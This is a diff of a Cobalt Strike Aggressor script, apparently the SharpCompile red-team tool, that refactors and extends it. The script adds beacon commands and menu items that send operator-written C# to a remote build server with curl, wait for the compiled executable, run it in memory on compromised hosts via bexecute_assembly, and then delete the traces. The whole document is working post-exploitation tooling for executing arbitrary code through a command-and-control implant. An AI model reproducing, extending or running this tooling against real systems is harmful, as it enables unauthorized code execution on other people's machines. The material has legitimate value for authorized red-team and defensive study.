@@ -5,57 +5,159 @@
 # |____/|_| |_|\__,_|_|  | .__/ \____\___/|_| |_| |_| .__/|_|_|\___|
 #                        |_|                        |_| 
 # 							@dtmsecurity 2018
+#		        Some improvements by https://github.com/bitsadmin
 #
 # BEGIN CONFIG
 #
 # Server URI:
 $sharpcompileserver = "https://<build server IP>/";
 # Temporary path that exists on operator system:
-$sharpcompilepath = "/SharpCompileTemp/";
+$sharpcompilepath = "/tmp/SharpCompileTemp/";
 #
 # END CONFIG
 #
-beacon_command_register("sharp-exec", "Compile and execute C-Sharp","Synopsis: sharp-exec [code]\n");
+beacon_command_register("sharp-exec", "Compile and execute C-Sharp code","Synopsis: sharp-exec [code]\n");
+beacon_command_register("sharp-fexec", "Compile and execute C-Sharp file","Synopsis: sharp-exec [file] [arguments]\n");
 
-alias sharp-exec{
-	$executionId  = "sharpcompile_" . int(rand() * 100000);
+sub generate_executionId
+{
+	return "sharpcompile_" . int(rand() * 100000);
+}
 
-	$temporaryCsharp =  $sharpcompilepath . $executionId . ".cs";
-	$executableFilename = $sharpcompilepath . $executionId . ".exe";
+sub create_cs
+{
+	$csFile = $sharpcompilepath . "sharpcompile_" . $executionId . ".cs";
 
-	$code = replace($0, "sharp-exec ", "");
+	# Template
+	$cs = "";
+	$cs = $cs . "using System;\r\n";
+	$cs = $cs . "namespace sharpcompile\r\n";
+	$cs = $cs . "{\r\n";
+	$cs = $cs . "	class sharp\r\n";
+	$cs = $cs . "	{\r\n";
+	$cs = $cs . "		static void Main()\r\n";
+	$cs = $cs . "		{\r\n";
+	$cs = $cs . "			$2\r\n";
+	$cs = $cs . "		}\r\n";
+	$cs = $cs . "	}\r\n";
+	$cs = $cs . "}\r\n";
 
-	$csharp = "";
-	$csharp = $csharp . "using System;\n";
-	$csharp = $csharp . "namespace sharpcompile\n";
-	$csharp = $csharp . "{\n";
-	$csharp = $csharp . "	class sharp\n";
-	$csharp = $csharp . "	{\n";
-	$csharp = $csharp . "		static void Main()\n";
-	$csharp = $csharp . " 		{\n";		
-	$csharp = $csharp . "			$code\n";
-	$csharp = $csharp . "		}\n";
-	$csharp = $csharp . "	}\n";
-	$csharp = $csharp . "}\n";
-
-	$outputfile = "> " . $temporaryCsharp;
-	$handle = openf($outputfile);
-	writeb($handle, $csharp);
+	# Write to file
+	$outFile = "> " . $csFile;
+	$handle = openf($outFile);
+	writeb($handle, $cs);
 	closef($handle);
 
-	@command = @('curl','--request','POST','--data-binary','@'.$temporaryCsharp,'-o',$executableFilename,$sharpcompileserver);
+	return $csFile;
+}
 
-	exec(@command);
+sub compile_cs
+{
+	# Compile .exe filename
+	$exeFile = $sharpcompilepath . $1 . ".exe";
+	$csFile = $2;
+	$cleanup = $3;
 
-	sleep(3000);
+	# Send request to SharpCompileServer
+	@command = @("curl", "--request", "POST", "--data-binary", "@".$csFile, "-o", $exeFile, $sharpcompileserver);
+	exec(@command); # exec() function is not blocking
 
-	deleteFile($temporaryCsharp);
+	# Workaround to make sure full binary has been received
+	$size = -1;
+	$timeout = 30;
+	while ((!-exists $exeFile || $size < 0 || $size < $newsize) && $timeout > 0) {
+		$size = $newsize;
+		$newsize = lof($exeFile);
+		sleep(100);
+		$timeout -= 1;
+	}
 
-	bexecute_assembly($1, $executableFilename);
+	if($cleanup)
+	{
+		deleteFile($csFile);
+	}
 
-	sleep(1000);
+	if($timeout <= 0)
+	{
+		return "";
+	}
 
-	deleteFile($executableFilename);
+	return $exeFile;
+}
+
+sub execute_exe
+{
+	$bid = $1;
+	$exeFile = $2;
+	$params = $3;
+
+	# Execute
+	bexecute_assembly($bid, $exeFile, $params);
+
+	# Workaround to make sure file is deleted
+	while (-exists $exeFile)
+	{
+		sleep(100);
+		deleteFile($exeFile);
+	}
+}
+
+sub cmd-sharp-exec # (0=$ref, 1=$code, 2=$bid)
+{
+	$bid = $2;
+	$executionId = generate_executionId();
+
+	# Extract code
+	$code = replace($1, "sharp-exec ", "");
+
+	# Obtain .cs filepath
+	$csFile = create_cs($executionId, $code);
+
+	# Compile .cs and obtain .exe
+	$exeFile = compile_cs($executionId, $csFile, 1);
+
+	if($exeFile eq "")
+	{
+		berror($bid, "Timeout while attempting to compile");
+		return;
+	}
+
+	# Execute .exe and cleanup
+	execute_exe($bid, $exeFile, "");
+}
+
+sub cmd-sharp-fexec # (0=$ref, 1=$full_cmdline, 2=$bid, 3=$filename)
+{
+	$bid = $2;
+	$csFile = $3;
+	$executionId = generate_executionId();
+
+	# Extract commandline arguments for executable
+	$args = replace($1, "sharp-fexec ", "");
+	$args = replace($args, $csFile, "");
+	$args = matches($args, '\s*(.*)\s*')[0]; # Trim whitespaces
+
+	# Compile .cs and obtain .exe
+	$exeFile = compile_cs($executionId, $csFile, 0); 
+
+	if($exeFile eq "")
+	{
+		berror($bid, "Timeout while attempting to compile");
+		return;
+	}
+
+	# Execute .exe and cleanup
+	execute_exe($bid, $exeFile, $args);
+}
+
+alias sharp-exec
+{
+	cmd-sharp-exec($0, $1, $2, $3);
+}
+
+alias sharp-fexec
+{
+	cmd-sharp-fexec($0, $1, $2, $3);
 }
 
 popup beacon {
@@ -63,42 +165,14 @@ popup beacon {
 		item "&Compile and Execute C-Sharp"{
 			foreach $bid ($1){
 				prompt_file_open("Choose a .CS file", $null, false, {
-					$executionId  = "sharpcompile_" . int(rand() * 100000);
-
-					$executableFilename = $sharpcompilepath . $executionId . ".exe";
-			
-					@command = @('curl','--request','POST','--data-binary','@'.$1,'-o',$executableFilename,$sharpcompileserver);
-
-					exec(@command);
-
-					sleep(3000);
-
-					bexecute_assembly($bid, $executableFilename);
-
-					sleep(1000);
-
-					deleteFile($executableFilename);
+					cmd-sharp-fexec("", $bid, $1);
 				});
 			}
 		}
 		item "&Compile and Execute C-Sharp (With Arguments)"{
 			foreach $bid ($1){
 				$dialog = dialog("Compile and execute C-Sharp", $null, lambda({
-					$executionId  = "sharpcompile_" . int(rand() * 100000);
-
-					$executableFilename = $sharpcompilepath . $executionId . ".exe";
-			
-					@command = @('curl','--request','POST','--data-binary','@'.$3["file"],'-o',$executableFilename,$sharpcompileserver);
-
-					exec(@command);
-
-					sleep(3000);
-
-					bexecute_assembly($bid, $executableFilename, $3["args"]);
-
-					sleep(1000);
-
-					deleteFile($executableFilename);
+					cmd-sharp-fexec($3["args"], $bid, $3["file"]);
 				}));
 				drow_file($dialog, "file", "Choose a .CS file:");
 				drow_text($dialog, "args",  "Assembly Arguments:");
